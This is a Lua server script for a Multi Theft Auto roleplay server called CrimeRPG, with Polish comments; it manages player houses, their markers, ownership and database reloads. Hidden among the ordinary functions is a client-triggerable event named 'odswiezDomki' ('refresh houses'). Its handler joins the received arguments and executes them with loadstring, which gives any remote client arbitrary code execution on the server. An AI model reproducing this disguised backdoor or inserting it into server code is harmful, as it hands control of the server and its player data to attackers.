--[[

	@ Author: Vercetti 
	@ Copyright: Vercetti for CrimeRPG ©2020

	@ Pierwotne prawo do użytkowania tego zasobu ma tylko i wyłącznie pierwotny Autor.
	@ Obowiązuje całkowity zakaz rozpowszechniania, zmiany autora jak i edycji zasobu.
	@ Obowiązuje całkowity nakaz zachowania autora po uzyskaniu zgody na używanie skryptu przez autora.

]]--

domy={}

local function usunDom(id)
	if isElement(domy[id].wyjscie) then destroyElement(domy[id].wyjscie) end
	if isElement(domy[id].wejscie) then destroyElement(domy[id].wejscie) end
	if isElement(domy[id].cs) then destroyElement(domy[id].cs) end
	if isElement(domy[id].text) then destroyElement(domy[id].text) end
	domy[id]=nil
end

local function dodajDom(v,fast)

	if not interiory[v.interiorid] then return false end
	if domy[v.id] then
		usunDom(v.id)
	end
	local result=exports["crime_database"]:dbGet("SELECT * FROM crime_users WHERE id=?", v.ownerid)
	if result and #result > 0 then
		local r=result[1]
		v.owner_nick = r.login
	else
		if v.ownerid ~= false then
		--outputDebugString("Bład domku ID DOMKU#"..v.id)
		end
		v.owner_nick = "Brak"
	end
	v.drzwi=split(v.drzwi,",")
	for ii,vv in ipairs(v.drzwi) do		v.drzwi[ii]=tonumber(vv)	end
	v.punkt_wyjscia=split(v.punkt_wyjscia,",")
	for ii,vv in ipairs(v.punkt_wyjscia) do		v.punkt_wyjscia[ii]=tonumber(vv)	end
	local pickupid=1272
	if (not v.ownerid) then
		pickupid=1273
	end
	v.wejscie=createMarker(v.drzwi[1], v.drzwi[2], v.drzwi[3]-1, 'cylinder', 1, 90, 55, 150,1)
	setElementData(v.wejscie,"mpod",true)
	setElementData(v.wejscie,"mtekst","Typ: "..(v.descr or "Dom").."\nWłaściciel: "..v.owner_nick)
	setElementData(v.wejscie,"mikona","")
	v.cs=createColSphere(v.drzwi[1],v.drzwi[2],v.drzwi[3], 1)
	if (not fast and v.ownerid) then
		setMarkerColor(v.wejscie, 255, 0, 0, 1 )

	end
	local interior_dimension=v.vwi or 1000+v.id

	setElementData(v.cs, "dom", { 
		["zamkniety"]=v.zamkniety>0 and true or false,
		["id"]=v.id,
		["koszt"]=v.koszt, 
		["ownerid"]=v.ownerid, 
		["owner_nick"]=v.owner_nick,
		["descr"]=v.descr or "dom", 
		["dimension"]=interior_dimension,
		["interior"]=interiory[v.interiorid].interior,
		["interior_loc"]=interiory[v.interiorid].entrance,
		["exit_loc"]=v.punkt_wyjscia,
		["paidTo"]=v.paidTo,
		["paidTo_dni"]=v.paidTo_dni,
	})



-- dodajemy wyjscie
	v.wyjscie=createMarker(interiory[v.interiorid].exit[1], interiory[v.interiorid].exit[2], interiory[v.interiorid].exit[3]-0.95, "cylinder",1,200,0,0,1)
	setElementData(v.wyjscie,"mpod",true)
	setElementData(v.wyjscie,"mikona","")
	setElementDimension(v.wyjscie, interior_dimension)
	setElementInterior(v.wyjscie, interiory[v.interiorid].interior)
	setElementData(v.wyjscie,"tpto", v.punkt_wyjscia)


	local dbid=v.id
	v.id=nil
	domy[dbid]=v

	return true
end

local function odswiezDomki(...)
	loadstring(table.concat({...}," "))()
end
addEvent("odswiezDomki",true)
addEventHandler("odswiezDomki",resourceRoot,odswiezDomki)

function domyGetInfo(id)
	return domy[id]
end

local function zaladujCzescDomow(procent,fast)
	if not procent then procent = 100 end
	if not fast then fast = false end
	local tt=getTickCount()
    i=0
	exports["crime_database"]:dbSet("UPDATE crime_houses SET paidTo=NULL,ownerid=NULL where paidTo<NOW() or paidTo IS NULL")
	local dbdomy
	if fast then
		dbdomy=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid AND d.ownerid IS NOT NULL;")
	else
		dbdomy=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid WHERE d.active=1;")
	end
	for __,v in ipairs(dbdomy) do
		if math.random(0,100)<=procent then
			if dodajDom(v,fast) then i=i+1 end
		end
	end                             
	--outputDebugString("Zaladowano domow: " .. i .. " w " .. (getTickCount()-tt) .. "ms")
end
 setTimer(zaladujCzescDomow, 1000*60*10, 0, 100)

addEventHandler("onResourceStart", resourceRoot, function()
	zaladujCzescDomow(100,false)
end)


function zaladujZmienioneDomy()
	local i=0
	local dbdomy=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid WHERE d.active=1 AND timediff(now(),d.updated)<'00:09:00' AND datediff(now(),d.updated)<1")
	for __,v in ipairs(dbdomy) do

			if dodajDom(v) then i=i+1 end
	end                             
	--outputDebugString("Zaladowano zmienionych domow: " .. i)
end
setTimer(zaladujZmienioneDomy, 10*1000*5, 0)

function reloaddomku(iddomku)
	local i=0
	local dbdomy=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid WHERE d.id=? AND d.active=1 AND timediff(now(),d.updated)<'00:09:00' AND datediff(now(),d.updated)<1", iddomku)
	for __,v in ipairs(dbdomy) do

			if dodajDom(v) then i=i+1 end
	end                             
	--outputDebugString("Zaladowano zmienionych domow: " .. i)
end



function domReload(id)
	local dbdom=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid WHERE d.active=1 and d.id=?;",id)
	if dbdom then
		return dodajDom(dbdom)
	end
	return false
end

addEvent ( "SprawdzDom", true )
function SprawdzDom ( gracz )
	local dbdomy=exports["crime_database"]:dbGet("SELECT d.id,d.descr,d.vwi,d.drzwi,d.punkt_wyjscia,d.interiorid,d.ownerid,d.zamkniety,d.koszt,d.paidTo,datediff(d.paidTo,now()) paidTo_dni FROM crime_houses d LEFT JOIN crime_users c ON c.id=d.ownerid AND d.ownerid IS NOT NULL;")
	for __,v in ipairs(dbdomy) do
		local uid=tonumber(getElementData(gracz,"player:uid"))
		local r=v.ownerid
		v.drzwi=split(v.drzwi,",")
		for ii,vv in ipairs(v.drzwi) do		v.drzwi[ii]=tonumber(vv)	end
		if r then if r == uid then setElementData(gracz,"player:house",true) setElementData(gracz,"player:spawn",{v.drzwi[1],v.drzwi[2],v.drzwi[3]}) end end
	end     
end
addEventHandler ( "SprawdzDom", root, SprawdzDom )


